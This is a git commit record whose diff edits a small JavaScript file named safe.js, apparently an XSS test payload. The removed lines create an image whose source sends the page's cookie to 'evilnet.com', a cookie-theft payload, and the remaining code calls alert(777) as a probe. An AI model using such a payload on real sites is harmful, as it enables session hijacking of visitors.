0cab29759ba6e049df9d5225083ebc5780415566
necrotomero <37853122+necrotomero@users.noreply.github.com>
2020-05-11 23:06:55 +1000

    Update safe.js

--- safe.js
+++ safe.js
@@ -1,9 +1,6 @@
 
 function safeToken(){
         alert(777);
-        var img = document.createElement('img');
-        img.src='http://evilnet.com'+documet.cookie;
-        document.body.appendChild(img);
 }
 
 safeToken();
